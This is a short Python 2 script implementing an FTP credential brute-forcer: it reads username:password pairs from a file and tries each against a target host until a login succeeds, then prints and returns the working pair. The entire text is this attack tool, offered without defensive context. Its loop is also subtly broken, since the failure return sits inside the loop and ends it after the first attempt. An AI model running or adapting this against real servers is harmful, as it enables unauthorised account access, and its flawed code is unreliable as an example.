import ftplib


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        usrName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying: " + usrName + "/" + passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(usrName, passWord)
            print '\n[+] ' + str(hostname) + ' FTP Logon Succeeded: ' + \
                usrName + '/' + passWord
            ftp.quit()
            return (usrName, passWord)
        except Exception, e:
            pass
        print '\n[-] ' + 'Could not brute force FTP credentials.'
        return (None, None)

host = ''
passwdFile = ''
bruteLogin(host, passwdFile)
